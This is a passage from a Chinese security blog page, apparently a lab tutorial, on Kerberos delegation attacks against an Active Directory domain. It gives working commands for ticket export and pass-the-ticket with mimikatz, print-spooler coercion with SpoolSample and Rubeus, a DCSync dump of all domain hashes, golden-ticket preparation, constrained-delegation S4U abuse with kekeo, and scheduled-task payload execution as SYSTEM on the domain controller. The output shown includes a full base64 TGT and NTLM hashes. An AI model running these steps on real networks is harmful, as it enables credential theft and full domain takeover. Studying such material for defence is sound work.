+<pre class="line-numbers language-none"><code class="language-none">net use \\PC-MB.HACK.COM /user:hack\administrator 123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4、去pc-mb导出内存中的票据"><a href="#4、去pc-mb导出内存中的票据" class="headerlink" title="4、去pc-mb导出内存中的票据"></a>4、去pc-mb导出内存中的票据</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::tickets /export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="5、进行票据传递就可以获取域控的权限了"><a href="#5、进行票据传递就可以获取域控的权限了" class="headerlink" title="5、进行票据传递就可以获取域控的权限了"></a>5、进行票据传递就可以获取域控的权限了</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt [0;14fd275]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="6、访问域控"><a href="#6、访问域控" class="headerlink" title="6、访问域控"></a>6、访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="7、使用计划任务，服务-或者无文件的powershell上线"><a href="#7、使用计划任务，服务-或者无文件的powershell上线" class="headerlink" title="7、使用计划任务，服务,或者无文件的powershell上线"></a>7、使用计划任务，服务,或者无文件的powershell上线</h3><pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\c$
+shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /f
+shell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="利用非约束委派域控被动访问控制域控"><a href="#利用非约束委派域控被动访问控制域控" class="headerlink" title="利用非约束委派域控被动访问控制域控"></a>利用非约束委派域控被动访问控制域控</h2><table>
+<thead>
+<tr>
+<th>机器位置</th>
+<th>机器IP</th>
+<th>机器名</th>
+<th>机器登录用户</th>
+<th>所属域</th>
+<th>委派配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域内域控制器</td>
+<td>192.168.70.16</td>
+<td>dc</td>
+<td>hack\administrator</td>
+<td>hack.com</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>域内机器</td>
+<td>192.168.70.14</td>
+<td>pc-mb</td>
+<td>hack\lihua</td>
+<td>hack.com</td>
+<td>配置了非约束委派</td>
+</tr>
+</tbody></table>
+<p><strong>实验前提:控制了域内的一台机器OA,并且该机器的服务账号配置了非约束委派，如下:</strong></p>
+<p>一般域管不会主动访问我们，我们可以利用**Windows打印系统远程协议(MS- RPRN)**中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。非约束性委派主机结合Spooler打印机服务漏洞，让域控机器DC强制访问已控的具有本地管理员权限的非约束性委派机器OA，从而拿到域管理员的TGT,进而接管域控。(2008机器可能复现不了 ，因为版本的问题)</p>
+<p><strong>进行实验之前一-定要把所有的防火墙关闭!所有的防火墙关闭!所有的防火墙关闭!</strong></p>
+<h3 id="1、首先利用Rubeus"><a href="#1、首先利用Rubeus" class="headerlink" title="1、首先利用Rubeus"></a>1、首先利用Rubeus</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://codeload.github.com/shanfenglan/test/zip/refs/heads/master">https://codeload.github.com/shanfenglan/test/zip/refs/heads/master</a></p>
+<p>在0A上以<strong>本地管理员权限</strong>执行以下命令,每隔一秒监听来自域控机器DC的登录信息</p>
+<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe monitor /interval:1 /filteruser:DC$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="2、再利用SpoolSample强制域控打印机回连"><a href="#2、再利用SpoolSample强制域控打印机回连" class="headerlink" title="2、再利用SpoolSample强制域控打印机回连"></a>2、再利用SpoolSample强制域控打印机回连</h3><p>需在<strong>域用户</strong>进程上执行，所以这里切换成了普通域用户帐号去执行</p>
+<pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe DC pc-mb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3、Rubeus监听票据"><a href="#3、Rubeus监听票据" class="headerlink" title="3、Rubeus监听票据"></a>3、Rubeus监听票据</h3><pre class="line-numbers language-none"><code class="language-none">doIFODCCBTSgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQobCEhBQ0suQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0GwhIQUNLLkNPTaOCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4TphTWvbFIKyprPnEUM6qpyQIaF5dWb7VdcGY+/jHUlMjAEuUTCzHUx96YOkdDB1uhIzpAEy2YxqLLxtw5JudwQiPC7fAdKi9pLz3tL0BqkCeA4CZEkKP6ZeS0uFVBkZQYhkwYdlSE0tyv/URVkOKT5OJ+XZLkxjl7hCYXtdOFYEj1UiAQtI/cRTIAgLpJXuYHKUeuXwjL50BdOSc3Gvn7TsV1R/waVZXTTJ0pm63oySxeRBSx+Khiav+V+fEF9o6kyuxO0muIL0F9hWYdDjhclkYvMpx/dBJ7Dh0jY3DtQ5GhVneVwAIgFpINPU1rOWXEbGFyg8mjBI58CnI7c4f0l0uxumBSjG04io/S6YGpKnys6HycR2qKHt8QLjYxpByB++Ak4yTXSbqSL1SnHgpAl0/XtWqkZUzmoQob/ry049+tk5QYyj+vAHbs5hjk8EWcdCB2+0q9nC/rYq2G1z1lIXABZcPR2BWMuGZRGvBC6sVTCv6oo0gFmiGwzVh6J/ZyruwVacqjr+6K42F0vGoAU7BN3Ub7dTK8RSwiktdtikIScFglHy1gZCyipJZ+qJzGjsmA4RlItXPHV9ExHI/XjfMjwCHgLQc9NfWE0nQcXE9KONoeZRu+k0yU2HbTUqLpC1aapn2de5pQ4BX137N1uEVokYirpdHZh/XDja8QiVx9HfJClqRoL76S6UUuIiXqi5zrUZEOoZblarK32PBveGUboTR/KgNFYNJxa5neDtkIO+pynr0oz3O+nGmv4bFbQ76ZHwbv3mIoUpaA5WhpLEpicWdaxHFlf24QX7FoxRMTXXthQTP1D5yqIyh9CMH+un4yMupXIWcrlsE+Sk6+N0sYy0Ee2Xuf5HSLOa3s4hccDo5NiE+OAcihkcK6yGYh/qplw3WzWVsydOXrT26a9J0swmnT/3Bo+7mu+MW/UOo5QAKwiDe7utkL84cucmnId6XPufrjJoeuZN66p6ii0tKGx/Vmbi+dFlHIdzJoqZnCoDC8AFqBBZPLM1yn7A3mgIc3ZKVtHziK0NtenQ4rAnazS9IqO/0rXyLV9/WjVBKBDgNRB8w3fOLsXepwMJOYiEurDAMh/pAlOWPfXy34/MaXHZ6A+ED2wryTquG+/MKKfRgn31qDT1vym81hB4Tq0nv8ezqhmKCR0kD3Qg7rydTpS/jVpVpAfjhy+NgFlRnq/pOAxLf5v0H6qMp1n1AfV16sIcWv+ulSMdfqP0i556w5qs71b+LTHvnEABo5hIzSPrVdMUD2EuPjGqsii6RnUZLdxbNzuB3VP9rykykbP5bKUMEqPNJI07mQSEIg9sqB7fybPjPfkH7BZSQWJqWA9YOiWP5tA6jgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCBS2Pbn1k4vlrZNqzexWJjeHXlDnZ3VtIpJQhOcDz82RaEKGwhIQUNLLkNPTaIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIzMDQxNTIyNDI1NFqmERgPMjAyMzA0MTYwODQyNTRapxEYDzIwMjMwNDIyMDM0MTM5WqgKGwhIQUNLLkNPTakdMBugAwIBAqEUMBIbBmtyYnRndBsISEFDSy5DT00=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4、Rubeus导入票据"><a href="#4、Rubeus导入票据" class="headerlink" title="4、Rubeus导入票据"></a>4、Rubeus导入票据</h3><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe ptt /ticket:票据
+
+eg:
+Rubeus.exe ptt /ticket:doIFODCCBTSgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQobCEhBQ0suQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0GwhIQUNLLkNPTaOCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4TphTWvbFIKyprPnEUM6qpyQIaF5dWb7VdcGY+/jHUlMjAEuUTCzHUx96YOkdDB1uhIzpAEy2YxqLLxtw5JudwQiPC7fAdKi9pLz3tL0BqkCeA4CZEkKP6ZeS0uFVBkZQYhkwYdlSE0tyv/URVkOKT5OJ+XZLkxjl7hCYXtdOFYEj1UiAQtI/cRTIAgLpJXuYHKUeuXwjL50BdOSc3Gvn7TsV1R/waVZXTTJ0pm63oySxeRBSx+Khiav+V+fEF9o6kyuxO0muIL0F9hWYdDjhclkYvMpx/dBJ7Dh0jY3DtQ5GhVneVwAIgFpINPU1rOWXEbGFyg8mjBI58CnI7c4f0l0uxumBSjG04io/S6YGpKnys6HycR2qKHt8QLjYxpByB++Ak4yTXSbqSL1SnHgpAl0/XtWqkZUzmoQob/ry049+tk5QYyj+vAHbs5hjk8EWcdCB2+0q9nC/rYq2G1z1lIXABZcPR2BWMuGZRGvBC6sVTCv6oo0gFmiGwzVh6J/ZyruwVacqjr+6K42F0vGoAU7BN3Ub7dTK8RSwiktdtikIScFglHy1gZCyipJZ+qJzGjsmA4RlItXPHV9ExHI/XjfMjwCHgLQc9NfWE0nQcXE9KONoeZRu+k0yU2HbTUqLpC1aapn2de5pQ4BX137N1uEVokYirpdHZh/XDja8QiVx9HfJClqRoL76S6UUuIiXqi5zrUZEOoZblarK32PBveGUboTR/KgNFYNJxa5neDtkIO+pynr0oz3O+nGmv4bFbQ76ZHwbv3mIoUpaA5WhpLEpicWdaxHFlf24QX7FoxRMTXXthQTP1D5yqIyh9CMH+un4yMupXIWcrlsE+Sk6+N0sYy0Ee2Xuf5HSLOa3s4hccDo5NiE+OAcihkcK6yGYh/qplw3WzWVsydOXrT26a9J0swmnT/3Bo+7mu+MW/UOo5QAKwiDe7utkL84cucmnId6XPufrjJoeuZN66p6ii0tKGx/Vmbi+dFlHIdzJoqZnCoDC8AFqBBZPLM1yn7A3mgIc3ZKVtHziK0NtenQ4rAnazS9IqO/0rXyLV9/WjVBKBDgNRB8w3fOLsXepwMJOYiEurDAMh/pAlOWPfXy34/MaXHZ6A+ED2wryTquG+/MKKfRgn31qDT1vym81hB4Tq0nv8ezqhmKCR0kD3Qg7rydTpS/jVpVpAfjhy+NgFlRnq/pOAxLf5v0H6qMp1n1AfV16sIcWv+ulSMdfqP0i556w5qs71b+LTHvnEABo5hIzSPrVdMUD2EuPjGqsii6RnUZLdxbNzuB3VP9rykykbP5bKUMEqPNJI07mQSEIg9sqB7fybPjPfkH7BZSQWJqWA9YOiWP5tA6jgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCBS2Pbn1k4vlrZNqzexWJjeHXlDnZ3VtIpJQhOcDz82RaEKGwhIQUNLLkNPTaIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIzMDQxNTIyNDI1NFqmERgPMjAyMzA0MTYwODQyNTRapxEYDzIwMjMwNDIyMDM0MTM5WqgKGwhIQUNLLkNPTakdMBugAwIBAqEUMBIbBmtyYnRndBsISEFDSy5DT00=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5、获取域内用户的hash"><a href="#5、获取域内用户的hash" class="headerlink" title="5、获取域内用户的hash"></a>5、获取域内用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz lsadump::dcsync /all /csv
+[*] Tasked beacon to run mimikatz's lsadump::dcsync /all /csv command
+[+] host called home, sent: 787057 bytes
+[+] received output:
+[DC] 'hack.com' will be the domain
+[DC] 'DC.hack.com' will be the DC server
+[DC] Exporting domain 'hack.com'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+502	krbtgt	d5adb4aa3a471374f46ba24ba01cb08b	514
+1001	DC	1f0e20e21088dae3bfcfcf6d5f8bd98e	512
+1118	kkk	579da618cfbfa85247acf1f800a280a4	512
+1119	PC-GYX$	009d1c712c2ec3f9b4344dce33b40c73	4096
+1002	DC$	5717ea7a3688384a618e60400cfdb35c	532480
+1108	jack	e45a314c664d40a227f9540121d1a29d	66048
+500	Administrator	f4766727c46a2891f71c237b518727d5	66048
+1121	ABC$	2888e20ad4fc91ca391f9f0e0cfe37e6	2080
+1122	WANLI$	5956b201196858854f29b0503fef30e7	2080
+1117	PC-MB$	40e3866bd78eb3bcfc9b137e111eee06	528384
+1120	test	570a9a65db8fba761c1008a51d4c95ab	524800
+1113	lihua	68faaeedea6e05549453d18b03c6a8d2	66048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>如果当前的用户是管理员就可以使用PTH攻击，如果是普通的域用户就使用黄金票据</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">502	krbtgt	d5adb4aa3a471374f46ba24ba01cb08b	514
+500	Administrator	f4766727c46a2891f71c237b518727d5	66048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="6、制作黄金票据"><a href="#6、制作黄金票据" class="headerlink" title="6、制作黄金票据"></a>6、制作黄金票据</h3><pre class="line-numbers language-none"><code class="language-none">查看域号：shell whoami /user
+domain sid:S-1-5-21-3769107300-1842393386-2897162586
+
+用户名：administrtaor
+domain:hack.com
+domain sid:S-1-5-21-3769107300-1842393386-2897162586
+krbtgt hash:d5adb4aa3a471374f46ba24ba01cb08b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="assets/image-20230416114958275.png" alt="image-20230416114958275"></p>
+<h3 id="7、使用计划任务，服务，或者无文件的powershell-上线"><a href="#7、使用计划任务，服务，或者无文件的powershell-上线" class="headerlink" title="7、使用计划任务，服务，或者无文件的powershell.上线"></a>7、使用计划任务，服务，或者无文件的powershell.上线</h3><pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\C$
+shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /f
+shell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h1><h2 id="约束性委派场景"><a href="#约束性委派场景" class="headerlink" title="约束性委派场景"></a>约束性委派场景</h2><p>当这个<strong>用户不在域内</strong>，他在出差，不能使用kerberos去认证，只能使用其他协议认证web系统，那同样WEB系统<br>也需要访问文件服务的资源，这个时候如何认证呢?</p>
+<p><img src="assets/image-20230416121039659.png" alt="image-20230416121039659"></p>
+<p><strong>Widnows Server 2003之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限(配置了非约束<br>委派的机器在LSASS中缓存了用户的TGT票据可模拟用户去访问域中任意服务)，微软于2007年为Kerberos<br>协议进行扩展引入S4U(service for user)协议，该协议分为两个子协议</strong></p>
+<ol>
+<li>S4u2self (Service for User to Self)</li>
+<li>S4U2proxy (Service for User to Proxy)</li>
+</ol>
+<p>这两个扩展都允许服务代表用户从KDC请求票证。</p>
+<p>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务</p>
+<p><img src="assets/image-20230416121602074.png" alt="image-20230416121602074"></p>
+<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><ol>
+<li>服务账号B可以代表A申请访问B的票据，那么可不可以代表域管申请域管访问B的票据呢?在这个过程中，不需要域管参与，服务B自身就可以完成</li>
+<li>服务账号B可以代表A申请访问C的票据，那么可不可以代表域管申请域管访问C的票据呢?在这个过程中，不需要域管参与，服务B自身就可以完成</li>
+</ol>
+<h2 id="约束性委派攻击流程"><a href="#约束性委派攻击流程" class="headerlink" title="约束性委派攻击流程"></a>约束性委派攻击流程</h2><p>用户(A)访问WEB系统(B) ,B代表A去向KDC申请访问B的TGT和ST1 (使用S4u2self),用户A拿到了ST1就可以访问B了，如果在B上配置了约束性委派(A到C的约束委派)，则B能够使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给KDC,KDC返回B-个访问C的票据ST2,这样B就可以以用户的身份访问C</p>
+<p><img src="assets/image-20230416135234253.png" alt="image-20230416135234253"></p>
+<pre class="line-numbers language-none"><code class="language-none">1.通过NTLM或者其他认证
+2.B代表A申请A访问B的票据(TGT和ST1)
+3.KDC返回用户的TGT和ST1票据给B
+4.B把ST1票据给A
+5.A用ST1去访问B
+6.B拿着A的ST1作为证据，去申请访问C的ST2
+7.B用ST2票据访问C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="存在的问题是什么呢"><a href="#存在的问题是什么呢" class="headerlink" title="存在的问题是什么呢?"></a>存在的问题是什么呢?</h3><p><strong>只要我们伪造了A的TGT,就可以向KDC申请一张ST1, 有了ST1之后，就可以拿着ST1作为证据，向KDC申请访问<br>文件服务的票据ST2|</strong></p>
+<h2 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h2><table>
+<thead>
+<tr>
+<th>机器位置</th>
+<th>机器IP</th>
+<th>机器名</th>
+<th>机器登录用户</th>
+<th>所属域</th>
+<th>委派配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域内域控制器</td>
+<td>192.168.70.16</td>
+<td>dc</td>
+<td>hack\administrator</td>
+<td>hack.com</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>域内机器</td>
+<td>192.168.70.14</td>
+<td>pc-mb</td>
+<td>hack\lihua</td>
+<td>hack.com</td>
+<td>配置了约束委派</td>
+</tr>
+</tbody></table>
+<p><strong>实验前提:我们已经控制了pc-mb的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的HASH值</strong></p>
+<h3 id="1-查询约束性委派的机器和服务"><a href="#1-查询约束性委派的机器和服务" class="headerlink" title="1.查询约束性委派的机器和服务"></a>1.查询约束性委派的机器和服务</h3><pre class="line-numbers language-none"><code class="language-none">查询约束委派机器账户
+AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
+
+查询约束委派服务账户
+AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))" cndistinguishedName msds-allowedtodelegateto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><pre class="line-numbers language-none"><code class="language-none">AdFind V01.57.00cpp Joe Richards (support@joeware.net) November 2021
+
+Using server: DC.hack.com:389
+Directory: Windows Server 2012 R2
+
+dn:CN=PC-MB,CN=Computers,DC=hack,DC=com
+&gt;msDS-AllowedToDelegateTo: cifs/DC
+&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com/HACK
+&gt;msDS-AllowedToDelegateTo: cifs/DC/HACK
+&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com/hack.com
+&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com
+&gt;msDS-AllowedToDelegateTo: cifs/pc-gyx.hack.com
+&gt;msDS-AllowedToDelegateTo: cifs/PC-GYX
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>查询到PC-MB电脑配置了约束委派，委派的目标是DC的CIFS服务</strong></p>
+<h3 id="2、使用mimikatz获取机器账户NTLM-Hash"><a href="#2、使用mimikatz获取机器账户NTLM-Hash" class="headerlink" title="2、使用mimikatz获取机器账户NTLM Hash"></a>2、使用mimikatz获取机器账户NTLM Hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><pre class="line-numbers language-none"><code class="language-none">* Username : PC-MB$
+	 * Domain   : HACK
+	 * NTLM     : 40e3866bd78eb3bcfc9b137e111eee06
+	 * SHA1     : 44aa776091c4404d10f838dd00e7273fdcada588<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3、使用kekeo申请配置了约束委派机器账户PC-ZS-的TGT"><a href="#3、使用kekeo申请配置了约束委派机器账户PC-ZS-的TGT" class="headerlink" title="3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT"></a>3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<pre class="line-numbers language-none"><code class="language-none">kekeo "tgt::ask /user:PC-MB$ /NTLM:40e3866bd78eb3bcfc9b137e111eee06 /domain:hack.com" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>生成一张tgt<code>TGT_PC-MB$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</code></p>
+<h3 id="4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST"><a href="#4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST" class="headerlink" title="4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST"></a>4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</h3><pre class="line-numbers language-none"><code class="language-none">kekeo "tgs::s4u /tgt:TGT_PC-MB$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /user:Administrator@hack.com /service:cifs/dc.hack.com" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="生成一张st1和一张st2"><a href="#生成一张st1和一张st2" class="headerlink" title="生成一张st1和一张st2"></a>生成一张st1和一张st2</h4><pre class="line-numbers language-none"><code class="language-none">TGS_Administrator@hack.com@HACK.COM_PC-MB$@HACK.COM.kirbi
+TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="5、mimkatz注入"><a href="#5、mimkatz注入" class="headerlink" title="5、mimkatz注入"></a>5、mimkatz注入</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="6、访问域控-1"><a href="#6、访问域控-1" class="headerlink" title="6、访问域控"></a>6、访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../../../30-wu-xian-wifi-an-quan/wifi01-huan-jing-zhun-bei/di-1-zhang-wu-xian-an-quan-huan-jing-da-jian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
